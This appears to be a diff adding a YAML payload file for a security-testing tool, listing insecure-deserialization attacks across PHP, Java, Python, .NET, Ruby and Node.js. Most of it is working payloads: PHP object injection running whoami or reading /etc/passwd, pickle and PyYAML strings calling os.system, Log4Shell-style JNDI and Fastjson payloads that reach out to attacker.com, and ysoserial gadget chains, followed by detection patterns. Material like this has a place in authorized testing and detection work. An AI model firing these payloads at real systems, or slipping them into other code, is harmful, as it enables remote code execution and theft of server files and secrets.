@@ -1,0 +1,80 @@
+name: Insecure Deserialization
+description: Insecure deserialization across PHP, Java, Python, .NET, Ruby, Node.js
+basic_payloads:
+- O:1:"a":0:{}
+- a:1:{i:0;s:4:"test";}
+- '--- !ruby/object:Class'
+bypass_techniques:
+- name: PHP Object Injection
+  description: PHP unserialize() exploitation
+  payloads:
+  - O:7:"PHPExec":2:{s:1:"c";s:6:"whoami";}
+  - O:12:"FileHandler":1:{s:4:"file";s:11:"/etc/passwd";}
+  - O:9:"ShellExec":1:{s:4:"cmd";s:6:"id";}
+- name: PHP Phar Deserialization
+  description: PHP phar:// wrapper
+  payloads:
+  - phar://test.phar/test.txt
+  - phar://./uploads/test.jpg/test.txt
+- name: Java CommonsCollections
+  description: Apache CommonsCollections gadget chain
+  payloads:
+  - ysoserial CommonsCollections1 (RCE)
+  - ysoserial CommonsCollections5 (RCE)
+- name: Java JNDI Injection
+  description: Log4Shell-style JNDI injection
+  payloads:
+  - ${jndi:ldap://attacker.com/a}
+  - ${jndi:rmi://attacker.com:1099/exploit}
+  - ${jndi:dns://attacker.com/${env:HOSTNAME}}
+- name: Python Pickle
+  description: Python pickle/cPickle exploitation
+  payloads:
+  - cos\nsystem\n(S'id'\ntR.
+  - c__builtins__\neval\n(...tR.
+- name: Python YAML
+  description: PyYAML unsafe load exploitation
+  payloads:
+  - '!!python/object/new:os.system [''id'']'
+  - '!!python/object/apply:subprocess.check_output [''whoami'']'
+- name: .NET BinaryFormatter
+  description: .NET BinaryFormatter
+  payloads:
+  - ysoserial.net TextFormattingRunProperties
+  - ysoserial.net TypeConfuseDelegate
+- name: Ruby Marshal
+  description: Ruby Marshal.load exploitation
+  payloads:
+  - '--- !ruby/object:ERB'
+  - '--- !ruby/object:Kernel'
+- name: Node.js Serialization
+  description: node-serialize exploitation
+  payloads:
+  - '{"rce":"_$$ND_FUNC$$_function(){...}()"}'
+- name: Jackson Deserialization
+  description: FasterXML/Jackson polymorphic
+  payloads:
+  - '["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:..."}]'
+- name: Fastjson Deserialization
+  description: Alibaba Fastjson auto-type
+  payloads:
+  - '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/jndi"}'
+detection_patterns:
+- unserialize(
+- pickle.loads
+- yaml.load(
+- Marshal.load
+- BinaryFormatter
+- ObjectInputStream
+- readObject
+- 'Content-Type: application/x-java-serialized-object'
+chain_templates:
+- name: Deserialization -> RCE
+  description: Exploit gadget chain for RCE
+  requirements:
+  - deserialization_endpoint
+  - gadget_chain
+- name: Deserialization -> File Read
+  description: Read server files via deserialization
+  requirements:
+  - deserialization_endpoint
